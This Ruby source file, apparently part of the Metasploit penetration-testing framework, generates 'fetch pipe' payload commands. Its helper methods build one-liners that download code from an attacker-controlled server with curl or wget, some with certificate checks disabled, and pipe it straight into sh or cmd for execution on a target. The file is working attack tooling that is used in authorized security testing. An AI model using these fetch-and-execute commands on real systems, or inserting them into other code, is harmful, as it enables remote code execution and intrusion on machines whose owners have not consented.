module Msf
  ###
  #
  # Common library for http fetch-based payloads
  #
  ###
  module Payload::Adapter::Fetch::Pipe

    def _download_pipe(uripath)
      "#{srvnetloc}/#{uripath}"
    end

    def pipe_supported_binaries
      # this is going to expand when we add psh support
      return %w[CURL] if windows?

      %w[WGET CURL]
    end

    def generate_pipe_command(uri)
      # TODO: Make a check method that determines if we support a platform/server/command combination

      case datastore['FETCH_COMMAND'].upcase
      when 'WGET'
        return _generate_wget_pipe(uri)
      when 'CURL'
        return _generate_curl_pipe(uri)
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
      end
    end

    def pipe_srvuri
      return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?

      default_srvuri('pipe')
    end

    def _generate_curl_pipe(uri)
      execute_cmd = 'sh'
      execute_cmd = 'cmd' if windows?
      case fetch_protocol
      when 'HTTP'
        return "curl -s http://#{_download_pipe(uri)}|#{execute_cmd}"
      when 'HTTPS'
        return "curl -sk https://#{_download_pipe(uri)}|#{execute_cmd}"
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
      end
    end

    def _generate_wget_pipe(uri)
      case fetch_protocol
      when 'HTTPS'
        return "wget --no-check-certificate -qO- https://#{_download_pipe(uri)}|sh"
      when 'HTTP'
        return "wget -qO- http://#{_download_pipe(uri)}|sh"
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
      end
    end

  end
end
